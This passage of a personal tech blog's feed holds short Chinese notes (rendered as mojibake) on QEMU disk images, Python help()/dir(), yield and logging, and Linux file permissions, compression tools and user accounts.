title="åˆ›å»ºç¡¬ç›˜é•œåƒ"></a>åˆ›å»ºç¡¬ç›˜é•œåƒ</h3><p>é™¤éç›´æ¥ä» CM-ROM æˆ–ç½‘ç»œå¼•å¯¼, è¿è¡Œ QEMU æ—¶éƒ½éœ€è¦ç¡¬ç›˜é•œåƒ (ä¸€ä¸ªæ–‡ä»¶, å­˜å‚¨è™šæ‹Ÿæœºç¡¬ç›˜ä¸Šçš„å†…å®¹).</p><p>raw é•œåƒ, å’Œå®¢æˆ·æœºå™¨ä¸Šçœ‹åˆ°çš„å†…å®¹ä¸€æ¨¡ä¸€æ ·.</p><p>qcow2 æ ¼å¼, ä»…å½“å®¢æˆ·ç³»ç»Ÿå®é™…å†™å…¥å†…å®¹çš„æ—¶å€™, æ‰ä¼šåˆ†é…é•œåƒç©ºé—´.</p><p>QEMU æä¾› <code>qemu-img</code> å‘½ä»¤æ¥åˆ›å»ºç¡¬ç›˜é•œåƒ.</p><p>ä¹Ÿå¯ä»¥ç”¨ <code>dd</code> æˆ– <code>fallocate</code> å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ª raw é•œåƒ.</p><h1 id="HAV"><a href="#HAV" class="headerlink" title="HAV"></a>HAV</h1><p><a href="https://en.wikipedia.org/wiki/Hardware-assisted_virtualization">Wiki ç™¾ç§‘</a><br>HAV æ˜¯ Hardware-assisted virtualization çš„ç®€ç§°.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kde, kwin å’Œ krunner</title>
    <link href="/2022/08/25/kde-kwin-%E5%92%8C-krunner/"/>
    <url>/2022/08/25/kde-kwin-%E5%92%8C-krunner/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ä½¿ç”¨ startx å‘½ä»¤åæ— æ³•æ›´æ¢å£çº¸</title>
    <link href="/2022/08/25/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-startx-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%97%A0%E6%B3%95%E6%9B%B4%E6%8D%A2%E5%A3%81%E7%BA%B8/"/>
    <url>/2022/08/25/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-startx-%E5%91%BD%E4%BB%A4%E5%90%8E%E6%97%A0%E6%B3%95%E6%9B%B4%E6%8D%A2%E5%A3%81%E7%BA%B8/</url>
    
    <content type="html"><![CDATA[<p>æ— æ³•åœ¨ <code>gnome-tweaks tool</code> ç®¡ç†ç•Œé¢ä¸­æ›´æ¢ï¼Œä½†å¯ä»¥ç›´æ¥åœ¨è®¾ç½®é‡Œé¢æ›´æ¢ï¼Œæˆ–è€…å³é”®æ›´æ¢ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­æŸ¥çœ‹æ¨¡å—æˆ–å‡½æ•°çš„æ–‡æ¡£</title>
    <link href="/2022/08/24/Python-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E6%88%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%87%E6%A1%A3/"/>
    <url>/2022/08/24/Python-%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%A8%A1%E5%9D%97%E6%88%96%E5%87%BD%E6%95%B0%E7%9A%84%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<p>å¸¸è§çš„æŸ¥è¯¢å‡½æ•°æœ‰ help(), dir() å’Œ print().</p><h1 id="ä½¿ç”¨-help"><a href="#ä½¿ç”¨-help" class="headerlink" title="ä½¿ç”¨ help()"></a>ä½¿ç”¨ help()</h1><p>é¦–å…ˆè¿›å…¥äº¤äº’ç•Œé¢å¹¶è¾“å…¥ <code>help()</code>:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl">$ python3<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">help</span>()</span><br></code></pre></td></tr></table></figure><p>å°±ä¼šå‡ºç°:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span>&gt;<br></code></pre></td></tr></table></figure><p>è¾“å…¥ modules, å°±ä¼šæ˜¾ç¤ºæ‰€æœ‰çš„æ¨¡å—:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">help</span>&gt; modules<br></code></pre></td></tr></table></figure><p>è‹¥æŸ¥çœ‹æŸä¸€ä¸ªå‡½æ•°ï¼Œåœ¨ Python äº¤äº’ç•Œé¢ä¸‹:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">help</span>(requests.get)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥å…·ä½“çš„ modules name, å°±å¯ä»¥æŸ¥çœ‹. è¾“å…¥ <code>q</code> å¯ä»¥é€€å‡ºã€‚</p><h1 id="ä½¿ç”¨-dir"><a href="#ä½¿ç”¨-dir" class="headerlink" title="ä½¿ç”¨ dir()"></a>ä½¿ç”¨ dir()</h1><p>åŒæ ·åœ¨ Python çš„äº¤äº’ç•Œé¢ï¼Œéœ€è¦å…ˆ <code>import</code> å†æŸ¥çœ‹:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> requests</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">dir</span>(requests)</span><br></code></pre></td></tr></table></figure><p>ä¼šæ˜¾ç¤ºè¯¥æ¨¡å—çš„æ‰€æœ‰å…³é”®è¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­çš„ yeild çš„ç”¨æ³•</title>
    <link href="/2022/08/24/Python-%E4%B8%AD%E7%9A%84-yeild-%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <url>/2022/08/24/Python-%E4%B8%AD%E7%9A%84-yeild-%E7%9A%84%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>å¯ä»¥æŠŠ yield è§†ä¸º return. ä½†æ˜¯ï¼Œå¸¦æœ‰ yeild çš„å‡½æ•°ä¼šè¢«å½“åšä¸€ä¸ªç”Ÿæˆå™¨ï¼Œè€Œä¸å†æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ã€‚</p><p>è¿™ä¸ªå‡½æ•°å¯ä»¥ä¸ <code>next()</code> å‡½æ•°é…åˆä½¿ç”¨ï¼Œåœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œæ—¶ä¼šæ²¿ç€ä¸Šä¸€æ¬¡ yeild åœæ­¢å¤„å¼€å§‹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python çš„ logging åº“</title>
    <link href="/2022/08/24/Python-%E7%9A%84-logging-%E5%BA%93/"/>
    <url>/2022/08/24/Python-%E7%9A%84-logging-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>logging åœ¨è¿™é‡Œæ˜¯â€æ—¥å¿—â€çš„å«ä¹‰ã€‚</p><p>æ—¥å¿—æ˜¯ç”¨æ¥è®°å½•ç¨‹åºè¿è¡Œäº‹ä»¶çš„å·¥å…·ã€‚</p><h1 id="ä»€ä¹ˆæ—¶å€™ä½¿ç”¨-logging-åŒ…"><a href="#ä»€ä¹ˆæ—¶å€™ä½¿ç”¨-logging-åŒ…" class="headerlink" title="ä»€ä¹ˆæ—¶å€™ä½¿ç”¨ logging åŒ…"></a>ä»€ä¹ˆæ—¶å€™ä½¿ç”¨ logging åŒ…</h1><p>æ—¥å¿—å‡½æ•°çš„å‘½åä¾æ®äº<strong>äº‹ä»¶çº§åˆ«</strong>:</p><ul><li>DEBUG, é€šå¸¸ç”¨åœ¨è°ƒè¯•æ—¶è¾“å‡ºè¯¦ç»†ä¿¡æ¯</li><li>INFOï¼Œç¡®è®¤å‡½æ•°åœ¨æ­£å¸¸è¿è¡Œ</li><li>WARNING, åœ¨ç¨‹åºä¾æ—§èƒ½å¤Ÿæ­£å¸¸è¿è¡Œçš„æƒ…å†µä¸‹ï¼Œè®°å½•æŸä¸ªæœŸæœ›å¤–çš„è¿è¡Œäº‹ä»¶æˆ–è®°å½•ä¸€äº›è¾¾åˆ°ä¸´ç•Œå€¼çš„è¿è¡Œä¿¡æ¯</li><li>ERROR, å› ä¸ºæŸäº›ä¸¥é‡çš„è¿è¡Œé”™è¯¯ï¼Œå½±å“ç¨‹åºçš„æŸäº›åŠŸèƒ½ä½¿ç”¨</li><li>CRITICAL, è¿è¡Œé”™è¯¯å­˜åœ¨å¯¼è‡´ç¨‹åºä¸èƒ½ç»§ç»­è¿è¡Œçš„åœºæ™¯<br>é»˜è®¤çš„äº‹ä»¶çº§åˆ«ä¸º WARNING, åªæœ‰äº‹ä»¶çº§åˆ«é«˜äº WARNING æ‰ä¼šè¢«æ•æ‰ã€‚</li></ul><p>å¯ä»¥æ˜¾ç¤ºè®¾ç½®æ—¥å¿—çº§åˆ«ã€‚</p><h1 id="æŠŠæ—¥å¿—å†™å…¥æ–‡ä»¶"><a href="#æŠŠæ—¥å¿—å†™å…¥æ–‡ä»¶" class="headerlink" title="æŠŠæ—¥å¿—å†™å…¥æ–‡ä»¶"></a>æŠŠæ—¥å¿—å†™å…¥æ–‡ä»¶</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span><br>logging.basicConfig(<span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;example.log&#x27;</span>, <span class="hljs-attribute">level</span>=logging.DEBUG) # æŒ‡å®šäº†æ–‡ä»¶åä»¥åŠç­‰çº§<br>logging.<span class="hljs-built_in">debug</span>(<span class="hljs-string">&#x27;This message should go to the log file&#x27;</span>)<br>logging.<span class="hljs-built_in">info</span>(<span class="hljs-string">&#x27;So should this&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>basicConfig()</code> å‡½æ•°ä»…åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ç”Ÿæ•ˆã€‚ </p><p>åœ¨å‘½ä»¤è¡Œé…ç½®æ—¥å¿—çº§åˆ«:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">--<span class="hljs-built_in">log</span>=<span class="hljs-built_in">INFO</span><br></code></pre></td></tr></table></figure><h1 id="è®°å½•å˜é‡ä¿¡æ¯"><a href="#è®°å½•å˜é‡ä¿¡æ¯" class="headerlink" title="è®°å½•å˜é‡ä¿¡æ¯"></a>è®°å½•å˜é‡ä¿¡æ¯</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span><br>logging.<span class="hljs-built_in">warning</span>(<span class="hljs-string">&#x27;%s before you %s&#x27;</span>, <span class="hljs-string">&#x27;Look&#x27;</span>, <span class="hljs-string">&#x27;Leap!&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="è‡ªå®šä¹‰æ—¥å¿—ä¿¡æ¯çš„æ ¼å¼"><a href="#è‡ªå®šä¹‰æ—¥å¿—ä¿¡æ¯çš„æ ¼å¼" class="headerlink" title="è‡ªå®šä¹‰æ—¥å¿—ä¿¡æ¯çš„æ ¼å¼"></a>è‡ªå®šä¹‰æ—¥å¿—ä¿¡æ¯çš„æ ¼å¼</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> logging<br><br>logging.basicConfig(<span class="hljs-keyword">format</span>=<span class="hljs-string">&#x27;%(levelname)s:%(message)s&#x27;</span>, <span class="hljs-keyword">level</span>=logging.<span class="hljs-keyword">DEBUG</span>) # åˆ©ç”¨ <span class="hljs-keyword">format</span> å‚æ•°<br></code></pre></td></tr></table></figure><h1 id="å±•ç¤ºæ—¶é—´ä¿¡æ¯"><a href="#å±•ç¤ºæ—¶é—´ä¿¡æ¯" class="headerlink" title="å±•ç¤ºæ—¶é—´ä¿¡æ¯"></a>å±•ç¤ºæ—¶é—´ä¿¡æ¯</h1><p>å¢åŠ  <code>%(asctime)s</code> æ¥è®©ä½ çš„ç¨‹åºè¾“å‡ºæ—¶é—´ä¿¡æ¯ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import<span class="hljs-built_in"> logging</span><br><span class="hljs-built_in"></span><br>logging.basicConfig(<span class="hljs-attribute">format</span>=<span class="hljs-string">&#x27;%(asctime)s %(message)s&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰æ—¶é—´æ ¼å¼:</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">logging.basicConfig(format=&#x27;%(asctime)<span class="hljs-keyword">s</span> %(message)<span class="hljs-keyword">s</span>&#x27;, datefmt=&#x27;<span class="hljs-built_in">%m</span>/<span class="hljs-built_in">%d</span>/<span class="hljs-built_in">%Y</span> <span class="hljs-built_in">%I</span>:<span class="hljs-built_in">%M</span>:<span class="hljs-built_in">%S</span> <span class="hljs-built_in">%p</span>&#x27;) # ä¼ å…¥ datefmt å‚æ•°<br></code></pre></td></tr></table></figure><h1 id="error-æ–¹æ³•"><a href="#error-æ–¹æ³•" class="headerlink" title="error æ–¹æ³•"></a>error æ–¹æ³•</h1><p>å°† error æ–¹æ³•é‡Œçš„ exc_info å‚æ•°è®¾ç½®ä¸º Ture, å¯ä»¥æ‰“å°å‡º Traceback é”™è¯¯å †æ ˆä¿¡æ¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é¸Ÿå“¥çš„ Linux ç§æˆ¿èœ Notes</title>
    <link href="/2022/08/24/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-Notes/"/>
    <url>/2022/08/24/%E9%B8%9F%E5%93%A5%E7%9A%84-Linux-%E7%A7%81%E6%88%BF%E8%8F%9C-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬6ç« -Linux-æ–‡ä»¶ä¸ç›®å½•ç®¡ç†"><a href="#ç¬¬6ç« -Linux-æ–‡ä»¶ä¸ç›®å½•ç®¡ç†" class="headerlink" title="ç¬¬6ç«  Linux æ–‡ä»¶ä¸ç›®å½•ç®¡ç†"></a>ç¬¬6ç«  Linux æ–‡ä»¶ä¸ç›®å½•ç®¡ç†</h1><h2 id="6-4-æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™"><a href="#6-4-æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™" class="headerlink" title="6.4 æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™"></a>6.4 æ–‡ä»¶ä¸ç›®å½•çš„é»˜è®¤æƒé™ä¸éšè—æƒé™</h2><h3 id="6-4-3-æ–‡ä»¶ç‰¹æ®Šæƒé™-SUID-SGID-SBIT"><a href="#6-4-3-æ–‡ä»¶ç‰¹æ®Šæƒé™-SUID-SGID-SBIT" class="headerlink" title="6.4.3 æ–‡ä»¶ç‰¹æ®Šæƒé™: SUID, SGID, SBIT"></a>6.4.3 æ–‡ä»¶ç‰¹æ®Šæƒé™: SUID, SGID, SBIT</h3><h4 id="Set-UID"><a href="#Set-UID" class="headerlink" title="Set UID"></a>Set UID</h4><p>å½“ s è¿™ä¸ªæ ‡å¿—å‡ºç°åœ¨æ–‡ä»¶æ‹¥æœ‰è€…çš„ x æƒé™ä¸Šæ—¶ï¼Œæ­¤æ—¶è¢«ç§°ä¸º Set UID,ç®€ç§° SUID çš„ç‰¹æ®Šæƒé™.</p><p>SUID çš„é™åˆ¶ä¸åŠŸèƒ½:</p><ul><li>SUID æƒé™ä»…å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰æ•ˆ</li><li>æ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºè¦å…·æœ‰ x çš„å¯æ‰§è¡Œæƒé™ </li><li>æœ¬æƒé™ä»…åœ¨æ‰§è¡Œè¯¥ç¨‹åºçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ</li><li>æ‰§è¡Œè€…å°†å…·æœ‰è¯¥ç¨‹åºæ‹¥æœ‰è€…çš„æƒé™</li></ul><p>SUID ä¸èƒ½ç”¨åœ¨ shell è„šæœ¬ä¸Šé¢ï¼Œshell è„šæœ¬åªæ˜¯å°†å¾ˆå¤šçš„äºŒè¿›åˆ¶æ–‡ä»¶è°ƒç”¨æ‰§è¡Œè€Œå·².</p><h4 id="Set-GID"><a href="#Set-GID" class="headerlink" title="Set GID"></a>Set GID</h4><p>å½“ s åœ¨ç”¨æˆ·ç»„çš„ x æ—¶åˆ™ç§°ä¸º Set GID (SGID), å¯ç”¨ <code>ls</code> å‘½ä»¤æŸ¥çœ‹:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l <br></code></pre></td></tr></table></figure><p>ä¸ SUID ä¸åŒ, SGID å¯ä»¥é’ˆå¯¹æ–‡ä»¶æˆ–ç›®å½•æ¥è®¾ç½®ã€‚</p><p>å¦‚æœæ˜¯å¯¹æ–‡ä»¶ï¼ŒSGID æœ‰å¦‚ä¸‹çš„åŠŸèƒ½:</p><ul><li>SGID å¯¹äºŒè¿›åˆ¶ç¨‹åºæœ‰ç”¨</li><li>ç¨‹åºæ‰§è¡Œè€…å¯¹äºè¯¥ç¨‹åºæ¥è¯´ï¼Œéœ€å…·å¤‡ x çš„æƒé™</li><li>æ‰§è¡Œè€…åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å°†ä¼šè·å¾—è¯¥ç¨‹åºç”¨æˆ·ç»„çš„æ”¯æŒ</li></ul><p>å¦‚æœæ˜¯å¯¹ç›®å½•:</p><ul><li>ç”¨æˆ·è‹¥å¯¹äºæ­¤ç›®å½•æœ‰ r ä¸ x çš„æƒé™æ—¶ï¼Œè¯¥ç”¨æˆ·èƒ½å¤Ÿè¿›å…¥æ­¤ç›®å½•</li><li>ç”¨æˆ·åœ¨æ­¤ç›®å½•ä¸‹çš„æœ‰æ•ˆç”¨æˆ·ç»„ (effective group) å°†ä¼šå˜æˆè¯¥ç›®å½•çš„ç”¨æˆ·ç»„</li><li>è‹¥ç”¨æˆ·åœ¨æ­¤ç›®å½•ä¸‹å…·æœ‰ w çš„æƒé™ï¼Œåˆ™ç”¨æˆ·å»ºç«‹çš„æ–°æ–‡ä»¶ï¼Œè¯¥æ–°æ–‡ä»¶çš„ç”¨æˆ·ç»„ä¸æ­¤ç›®å½•çš„ç”¨æˆ·ç»„ç›¸åŒ</li></ul><h4 id="Sticky-Bit"><a href="#Sticky-Bit" class="headerlink" title="Sticky Bit"></a>Sticky Bit</h4><p>ç›®å‰åªé’ˆå¯¹ç›®å½•æœ‰æ•ˆ:</p><ul><li>å½“ç”¨æˆ·å¯¹äºæ­¤ç›®å½•å…·æœ‰ w, x æƒé™ï¼Œå³å…·æœ‰å†™å…¥çš„æƒåˆ©</li><li>å½“ç”¨æˆ·åœ¨è¯¥ç›®å½•ä¸‹å»ºç«‹æ–‡ä»¶æˆ–ç›®å½•æ—¶ï¼Œä»…æœ‰è‡ªå·±ä¸ root æ‰æœ‰æƒé™åˆ é™¤è¯¥æ–‡ä»¶</li></ul><h4 id="SUID-x2F-SGID-x2F-SBIT-æƒé™è®¾ç½®"><a href="#SUID-x2F-SGID-x2F-SBIT-æƒé™è®¾ç½®" class="headerlink" title="SUID&#x2F;SGID&#x2F;SBIT æƒé™è®¾ç½®"></a>SUID&#x2F;SGID&#x2F;SBIT æƒé™è®¾ç½®</h4><ul><li>4 ä¸º SUID</li><li>2 ä¸º SGID</li><li>1 ä¸º SBIT<br>å¦‚: <code>chmod 4755 filename</code>.</li></ul><h1 id="ç¬¬8ç« -æ–‡ä»¶ä¸æ–‡ä»¶ç³»ç»Ÿçš„å‹ç¼©"><a href="#ç¬¬8ç« -æ–‡ä»¶ä¸æ–‡ä»¶ç³»ç»Ÿçš„å‹ç¼©" class="headerlink" title="ç¬¬8ç«  æ–‡ä»¶ä¸æ–‡ä»¶ç³»ç»Ÿçš„å‹ç¼©"></a>ç¬¬8ç«  æ–‡ä»¶ä¸æ–‡ä»¶ç³»ç»Ÿçš„å‹ç¼©</h1><p>åœ¨ Linux ä¸‹, æ‰©å±•åæ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šæ„ä¹‰.</p><p>å¾ˆå¤š email éƒ½æœ‰å®¹é‡å¤§çº¦ 25MB æ¯å°ä¿¡çš„é™åˆ¶.</p><h2 id="8-2-Linux-ç³»ç»Ÿå¸¸è§çš„å‹ç¼©æŒ‡ä»¤"><a href="#8-2-Linux-ç³»ç»Ÿå¸¸è§çš„å‹ç¼©æŒ‡ä»¤" class="headerlink" title="8.2 Linux ç³»ç»Ÿå¸¸è§çš„å‹ç¼©æŒ‡ä»¤"></a>8.2 Linux ç³»ç»Ÿå¸¸è§çš„å‹ç¼©æŒ‡ä»¤</h2><p><img src="/../img/compress_cmd.png" alt="compress command"></p><p>tar å¯ä»¥å°†å¾ˆå¤šæ–‡ä»¶ â€œæ‰“åŒ…â€ æˆä¸ºä¸€ä¸ªæ–‡ä»¶.</p><p>å•çº¯çš„ tat åªæ˜¯ç”¨æ¥æ‰“åŒ…. ç°åœ¨çš„ç‰ˆæœ¬æœ‰äº†å‹ç¼©åŠŸèƒ½.</p><h3 id="8-2-1-gzip-zcat-x2F-zmore-x2F-zless-x2F-zgrep"><a href="#8-2-1-gzip-zcat-x2F-zmore-x2F-zless-x2F-zgrep" class="headerlink" title="8.2.1 gzip, zcat&#x2F;zmore&#x2F;zless&#x2F;zgrep"></a>8.2.1 gzip, zcat&#x2F;zmore&#x2F;zless&#x2F;zgrep</h3><p>gzip ä¸ºäº†å–ä»£ compress.</p><p>å‹ç¼©:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gzip -v æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>è§£å‹ç¼©:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gzip -d æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å‹ç¼©æ–‡ä»¶çš„åŸå§‹å†…å®¹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ zcat æ–‡ä»¶å.gz<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ <code>zmore</code>, <code>zless</code>, <code>zgrep</code> ç­‰.</p><p><code>-c</code> é€‰é¡¹å’Œé‡å®šå‘æ­é…:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ gzip -c service &gt; service.gz<br></code></pre></td></tr></table></figure><p><code>znew</code> å¯ä»¥æŠŠ compress å‘½ä»¤å½¢æˆçš„ <code>.Z</code> æ–‡ä»¶è½¬åŒ–æˆ <code>gzip</code> æ ¼å¼.</p><h3 id="8-2-2-bzip2-bzcat-x2F-bzmore-x2F-bzless-x2F-bzgrep"><a href="#8-2-2-bzip2-bzcat-x2F-bzmore-x2F-bzless-x2F-bzgrep" class="headerlink" title="8.2.2 bzip2, bzcat&#x2F;bzmore&#x2F;bzless&#x2F;bzgrep"></a>8.2.2 bzip2, bzcat&#x2F;bzmore&#x2F;bzless&#x2F;bzgrep</h3><p>bzip2 ä¸ºäº†å–ä»£ gzip å¹¶æä¾›æ›´ä½³çš„å‹ç¼©æ¯”.</p><p>å…¶ç”¨æ³•å‡ ä¹å’Œ gzip ç›¸åŒ.</p><h3 id="8-2-3-xz-xzcat-x2F-xzmore-x2F-xzless-x2F-xzgrep"><a href="#8-2-3-xz-xzcat-x2F-xzmore-x2F-xzless-x2F-xzgrep" class="headerlink" title="8.2.3 xz, xzcat&#x2F;xzmore&#x2F;xzless&#x2F;xzgrep"></a>8.2.3 xz, xzcat&#x2F;xzmore&#x2F;xzless&#x2F;xzgrep</h3><p>å‹ç¼©æ¯”æ›´é«˜.</p><p>å…¶ç”¨æ³•å’Œ bzip2&#x2F;xz ä¸€æ ·.</p><h2 id="8-3-æ‰“åŒ…æŒ‡ä»¤-tar"><a href="#8-3-æ‰“åŒ…æŒ‡ä»¤-tar" class="headerlink" title="8.3 æ‰“åŒ…æŒ‡ä»¤: tar"></a>8.3 æ‰“åŒ…æŒ‡ä»¤: tar</h2><p>å°†å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•åŒ…æˆä¸€ä¸ªå¤§æ–‡ä»¶çš„åŠŸèƒ½, è¢«ç§°ä¸ºæ‰“åŒ…æŒ‡ä»¤.</p><p>tar å¹¶ä¸ä¼šä¸»åŠ¨äº§ç”Ÿå»ºç«‹çš„æ–‡ä»¶å.</p><p><code>-f</code> åé¢è·Ÿæ–‡ä»¶å. ä¸€èˆ¬å°† <code>-f</code> é€‰é¡¹ä»å…¶ä»–é€‰é¡¹ä¸­ç‹¬ç«‹å‡ºæ¥.</p><p>å¦‚å‹ç¼©:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -jcv -f filename.tar.bz2 +è¦è¢«å‹ç¼©çš„æ–‡ä»¶æˆ–ç›®å½•<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -jtv -f filename.tar.bz2<br></code></pre></td></tr></table></figure><p>è§£å‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -jxv -f filename.tar.bz2 -C æƒ³è¦åœ¨å“ªä¸ªç›®å½•è§£å‹<br></code></pre></td></tr></table></figure><p>æœ‰æ—¶åŠ ä¸Š <code>-p</code> ä¿ç•™åŸæœ¬æ–‡ä»¶çš„æƒé™å’Œå±æ€§.</p><p>æ‹¿æ‰æ ¹ç›®å½•çš„åŸå› æ˜¯é˜²æ­¢è¦†ç›–.</p><p>å¯ä»¥åªè§£å¼€ <code>.tar</code> ä¸­çš„å•ä¸€æ–‡ä»¶.</p><p>ä½¿ç”¨ <code>--exclude=</code> å‚æ•°å¯ä»¥ä¸åŒ…æ‹¬æŸä¸ªæ–‡ä»¶æˆ–ç›®å½•.</p><p>å¯ä»¥ä»…å¤‡ä»½æ¯”æŸä¸ªæ—¶é—´æ›´æ–°çš„æ–‡ä»¶.</p><h1 id="ç¬¬13ç« -Linux-è´¦å·ç®¡ç†ä¸-ACL-æƒé™è®¾ç½®"><a href="#ç¬¬13ç« -Linux-è´¦å·ç®¡ç†ä¸-ACL-æƒé™è®¾ç½®" class="headerlink" title="ç¬¬13ç«  Linux è´¦å·ç®¡ç†ä¸ ACL æƒé™è®¾ç½®"></a>ç¬¬13ç«  Linux è´¦å·ç®¡ç†ä¸ ACL æƒé™è®¾ç½®</h1><h2 id="13-1-Linux-çš„è´¦å·ä¸ç”¨æˆ·ç»„"><a href="#13-1-Linux-çš„è´¦å·ä¸ç”¨æˆ·ç»„" class="headerlink" title="13.1 Linux çš„è´¦å·ä¸ç”¨æˆ·ç»„"></a>13.1 Linux çš„è´¦å·ä¸ç”¨æˆ·ç»„</h2><h3 id="13-1-1-ç”¨æˆ·æ ‡è¯†ç¬¦-UID-ä¸-GID"><a href="#13-1-1-ç”¨æˆ·æ ‡è¯†ç¬¦-UID-ä¸-GID" class="headerlink" title="13.1.1 ç”¨æˆ·æ ‡è¯†ç¬¦: UID ä¸ GID"></a>13.1.1 ç”¨æˆ·æ ‡è¯†ç¬¦: UID ä¸ GID</h3><p>è´¦å·çš„ ID ä¸ è´¦å·çš„å¯¹åº”åœ¨ <code>/etc/passwd</code> ä¸­ã€‚</p><p>æ¯ä¸ªç™»å½•çš„ç”¨æˆ·è‡³å°‘éƒ½ä¼šè·å–ä¸¤ä¸ª ID, ä¸€ä¸ªæ˜¯ç”¨æˆ· ID (User ID, 